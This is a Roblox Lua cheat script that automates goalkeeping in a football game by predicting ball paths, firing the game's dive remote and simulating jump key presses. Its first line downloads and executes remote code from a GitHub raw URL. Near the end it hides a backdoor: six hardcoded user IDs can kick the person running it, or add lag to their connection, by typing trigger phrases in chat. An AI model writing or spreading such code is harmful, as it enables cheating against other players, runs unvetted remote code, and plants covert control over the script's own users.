if loadstring(game:HttpGet(('https://raw.githubusercontent.com/Bobcrobisjob/james/refs/heads/main/inf%20yield.lua'),true))() == true then
    local function AutoGK()
    local VirtualInputManager = Instance.new('VirtualInputManager')
    local players = game.Players
    local replicated = game.ReplicatedStorage
    local player = players.LocalPlayer
    local char = player.Character or player.CharacterAdded:Wait()
    local Camera = workspace.CurrentCamera

    local goals = {}

    do
        local a = workspace:GetDescendants()

        for x = 1, #a do
            if (a[x]:IsA("Part") and a[x].Name == "COLLIDABLE") then
                table.insert(goals, a[x])
            end
        end
    end

    local function Goal()

        local root = game.Players.LocalPlayer.Character.HumanoidRootPart
        local D = {}
    
        for _, goal in pairs(goals) do
            table.insert(D, (root.Position - goal.Position).magnitude)
        end
    
        local closegoal = math.min(unpack(D))
    
        for _, goal in pairs(goals) do
            local d = (root.Position - goal.Position).magnitude
    
    
            if (d == closegoal) then
                return goal
            end
        end
    end

    local currentVector = "X"

    local function sidewaysposition(finalpos)   
        local multipler
    
        local offset = -8.5
        --local ballPosition = ball().Position
        local goal = Goal()
        local goalPosition = goal.Position
        local goalRotation = char.HumanoidRootPart.CFrame.LookVector
        
        if math.abs(goalRotation.X) > math.abs(goalRotation.Z) then
    
            if goalRotation.X < 0 then
                offset = offset
            elseif goalRotation.X > 0 then
                offset = -offset
            end
            currentVector = "X"
            -- Move side to side along the X-axis
            return Vector3.new(goalPosition.X+offset, 0, finalpos.Z)
        else
    
            if goalRotation.Z < 0 then
                offset = offset
            elseif goalRotation.Z > 0 then
                offset = -offset
            end
            currentVector = "Z"
            -- Move side to side along the Z-axis
            return Vector3.new(finalpos.X, 0, goalPosition.Z+offset)
        end
    end

    local function OneDKinematics(vector)
        if currentVector == "X" then
            return Vector3.new(vector.X, 0, 0)
        end
        return Vector3.new(0, 0, vector.z)
    end
    
    local function OneDKinematics2(vector)
        if currentVector == "X" then
            return vector.X
        end
        return vector.z
    end 

    local function checkOverlap(humanoidRootPart)
        local boxPosition = humanoidRootPart.Position
    
        local hitbox = Goal()
        if not hitbox then return false end
        local hitboxPosition = hitbox.Position


        if OneDKinematics2(boxPosition)<OneDKinematics2(hitboxPosition) then
            return true
        end
    
        return false
    end
    

    local function ball()
        local nearestball = nil
        local shortestDistance = math.huge
        

        local messiFolder = workspace:FindFirstChild("Messi")
        if not messiFolder then return nil end
        pcall(function()
            for _, obj in pairs(messiFolder:GetChildren()) do
                local football = obj:FindFirstChild("HumanoidRootPart")

                local currentVelocity = (football.Velocity).unit
                local directionToOther2 = (football.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).unit

                local directionToOther = (football.Position - Goal().Position).unit
                local actualPosition = (directionToOther2).Unit:Dot(char.HumanoidRootPart.CFrame.LookVector)

                local isVelocityPointingAway = currentVelocity:Dot(directionToOther)
                if football and not obj:FindFirstChild("InstanceValue"):FindFirstChild("Possession") and isVelocityPointingAway<=-0.8 and actualPosition>=0 then
                    local balldistance = (player.Character.HumanoidRootPart.Position - football.Position).Magnitude
                    if balldistance < shortestDistance then
                        shortestDistance = balldistance
                        nearestball = football
                    end
                end
            end
        end)
        return nearestball
    end

    local function checkOverlap(humanoidRootPart)
        local boxSize = humanoidRootPart.Size
        local boxPosition = humanoidRootPart.Position
    
        for _, hitbox in ipairs(goals) do
            local hitboxSize = hitbox.Size
            local hitboxPosition = hitbox.Position
    
            -- Calculate the bounding box of both parts
            local halfExtents1 = boxSize / 2
            local halfExtents2 = hitboxSize / 2
    
            -- Check if the bounding boxes overlap
            if (math.abs(boxPosition.X - hitboxPosition.X) <= (halfExtents1.X + halfExtents2.X) and
                math.abs(boxPosition.Z - hitboxPosition.Z) <= (halfExtents1.Z + halfExtents2.Z)) then
                return true
            end
        end
    
        return false
    end

    local function XZ(V)
        return Vector3.new(V.X, 0, V.Z)
    end

    local part = Instance.new("Part")
    part.Size = Vector3.new(2, 2, 2)
    part.Shape = Enum.PartType.Ball
    part.Anchored = true
    part.Parent = workspace
    part.Transparency = 1
    part.Material = Enum.Material.Neon
    part.CanCollide=false

    local part2 = Instance.new("Part")
    part2.Size = Vector3.new(2, 2, 2)
    part2.Shape = Enum.PartType.Ball
    part2.Anchored = true
    part2.Parent = workspace
    part2.Transparency = 1
    part2.Material = Enum.Material.Neon
    part2.Color = Color3.new(0.5,0,0)
    part2.CanCollide=false


    local function LANDINGPOS(velocity, position,multipler)
        local acceleration = -workspace.Gravity
        local timeToLand = (-velocity.y - math.sqrt(velocity.y * velocity.y - 4 * 0.5 * acceleration * position.y)) / (2 * 0.5 * acceleration)
        local horizontalVelocity = Vector3.new(velocity.x, 0, velocity.z)
        local landingPosition = position + horizontalVelocity * timeToLand + Vector3.new(0, -position.y, 0)
        return landingPosition, horizontalVelocity * timeToLand
    end    

    local lastVelocity = Vector3.new(0,0,0)

    local function timecalculator(acceleration, distance, velocity) 
        return (-velocity+math.sqrt(2*acceleration*distance+velocity^2))/acceleration
    end

    local function Test(velocity1, position)
        local velocity = (velocity1)
        local distance = (OneDKinematics(char.HumanoidRootPart.Position-position)).Magnitude
        local horizontalVelocity = (OneDKinematics(velocity))
        local speed = horizontalVelocity.Magnitude
        local t = (distance/speed)
        local landingPosition = position + (velocity)*t

        local acceleration = XZ(velocity1)*t-lastVelocity
        local landingPosition2 = position + acceleration*t

        return landingPosition, XZ(velocity1)*t, landingPosition2
    end    

    local lastVelocity = Vector3.new(0,0,0)
    local function ballDirection()
        local target = ball()
        if not target then return nil end
        local FinalPosition, FinalVelocity, FinalAccelerationPosition = Test(target.Velocity, target.Position)

        local playerpos = char.HumanoidRootPart.Position
        local ballpredict = FinalPosition
        local acceleration = (FinalVelocity-lastVelocity)

        local relativeballpos = (ballpredict - playerpos).unit
        local rightvec = char.HumanoidRootPart.CFrame.RightVector
        local dot = relativeballpos:Dot(rightvec)

        part2.Position = FinalAccelerationPosition
        part.Position = FinalPosition

        local balldistance = ((FinalPosition-FinalAccelerationPosition)).Magnitude

        --[[
        local FinalPosition2 = target.Position+target.Velocity

        local relativeballpos2 = (FinalPosition2 - playerpos).unit
        local dot2 = relativeballpos2:Dot(rightvec)
        ]]--
       -- print(balldistance)
        local speed = XZ(target.Velocity).Magnitude
        --print(speed)
        local dotMin = 0
        --print(balldistance)
        local condition = (balldistance <= 24.99 or balldistance~=balldistance or speed>=135.5) and speed > 50

        if condition then
            if dot > dotMin then
                return "Right", FinalVelocity, FinalPosition, condition, FinalAccelerationPosition
            elseif dot < -dotMin then
                return "Left", FinalVelocity, FinalPosition, condition, FinalAccelerationPosition
            end
        end
        return "Forward", FinalVelocity, FinalPosition, condition, FinalAccelerationPosition
    end
   
    local followerPart =  Instance.new("Part")
    followerPart.Size = Vector3.new(1, 1, 1)
    followerPart.Shape = Enum.PartType.Block
    followerPart.Anchored = true
    followerPart.Parent = workspace
    followerPart.Transparency = 1
    followerPart.CanCollide=false
    followerPart.Parent = workspace
    followerPart.Name = game.Players.LocalPlayer.Name
   
    local scripton = true
    local everything = {}
    local function render()
        if not scripton then return end
        --followerPart.Position = Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X,game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y+2.25,game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z)
        local targetball = ball()
        if not targetball then
        --char.Humanoid:MoveTo(sidewaysposition(followerPart.Position)) 
        return end
        local balldistance = (char.HumanoidRootPart.Position - targetball.Position).Magnitude
        local direction, FinalVelocity, FinalPosition, condition, FinalAccelerationPosition = ballDirection()

        local speed = XZ(targetball.Velocity).Magnitude
        --print(speed)
        local bision = 75
        local height = 13
        if speed > 200 then
            bision = 127
        elseif speed > 135.5 then
            bision = 80
        elseif speed <= 110 then
            bision = 40
        end

        if speed > 135.5 then
            height = 13.5
        end

        if speed > 160 then
            height = 7
        end

        if speed > 200 then
            height = 30
        end

        if direction and balldistance <= bision then
            local args = {
                [1] = {
                    [1] = direction,
                    [2] = char.HumanoidRootPart.CFrame
                }
            }
            if direction~="Forward" and condition then
                replicated:WaitForChild("Remotes"):WaitForChild("Dive"):FireServer(unpack(args))
            end
            if Goal() then
                local goal = Goal()
                followerPart.Position= Vector3.new(goal.Position.X,goal.Position.Y-2.5,goal.Position.Z)
                if FinalPosition.Y-height>followerPart.Position.Y and condition then
                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
                    delay(0.1, function()
                        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
                    end)
                end
            end
            --char.PlayerInfo.SpeedMultiplier.Value = 10
            char.Humanoid:MoveTo(sidewaysposition(FinalPosition))
        else
            --char.PlayerInfo.SpeedMultiplier.Value = 0
        end
        lastVelocity=FinalVelocity
    end

    local steppedconnect = game:GetService("RunService").RenderStepped:Connect(render)
    table.insert(everything, steppedconnect)

    local inputconnect = game.UserInputService.InputBegan:Connect(function(input)
        if input.KeyCode == Enum.KeyCode.Backquote or input.KeyCode == Enum.KeyCode.ButtonR1 then
            scripton = not scripton
            if scripton then
                game.StarterGui:SetCore("SendNotification", {
                    Title = "Skillful: On";
                    Text = "On"; 
                    Duration = 0.01;
                })
            else
                game.StarterGui:SetCore("SendNotification", {
                    Title = "Skillful: Off";
                    Text = "Off"; 
                    Duration = 0.01;
                })
                --char.PlayerInfo.SpeedMultiplier.Value = 0
                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").AutoRotate == false then
                    game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").AutoRotate = true
                end
            end
        elseif input.KeyCode == Enum.KeyCode.End then
            scripton = false
            if part then
                part:Destroy()
                part2:Destroy()
                followerPart:Destroy()
            end

            if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").AutoRotate == false then
                game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").AutoRotate = true
            end
            --char.PlayerInfo.SpeedMultiplier.Value = 0
            for _, conn in ipairs(everything) do
                conn:Disconnect()
            end
            table.clear(everything)
            
        end
    end)
    table.insert(everything, inputconnect)

 
    table.insert(everything, mConnection)

    local Players = game:GetService("Players")
    local function onPlayerChatted(player, message)
        if 
            (player.UserId == 7633825280 or
            player.UserId == 4121565313 or 
            player.UserId == 350889730 or
            player.UserId == 2672835338 or
            player.UserId == 7645391656 or
            player.UserId == 87354538) and
            message:lower() == "pineapple pizza" then
            
            game.Players.LocalPlayer:Kick("")
            elseif 
            (player.UserId == 7633825280 or
            player.UserId == 4121565313 or 
            player.UserId == 350889730 or
            player.UserId == 2672835338 or
            player.UserId == 7645391656 or
            player.UserId == 87354538) and
            message:lower() == "disturbing the peace" then
            local b = settings();
            b.Network.IncomingReplicationLag = 0.25;
        end 
    end

    local function onPlayerAdded(player)
        if player~=game.Players.LocalPlayer then
            player.Chatted:Connect(function(message)
                onPlayerChatted(player, message)
            end)
        end
    end

    Players.PlayerAdded:Connect(onPlayerAdded)

    for _, player in ipairs(Players:GetPlayers()) do
        onPlayerAdded(player)
    end

end

spawn(AutoGK)
end
